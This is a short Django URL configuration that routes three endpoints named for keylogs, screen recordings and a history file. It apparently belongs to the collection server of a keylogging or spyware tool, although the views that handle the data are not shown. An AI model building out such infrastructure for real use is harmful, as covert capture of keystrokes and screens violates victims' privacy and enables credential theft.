from django.urls import path
from . import views

urlpatterns = [
    path('keylogs/', views.getkeylogs, name='getkeylogs'),
    path('screenrecords/', views.getscreenrecords, name='getscreenrecords'),
    path('historyfile/', views.gethistory, name='gethistoryfile'),
]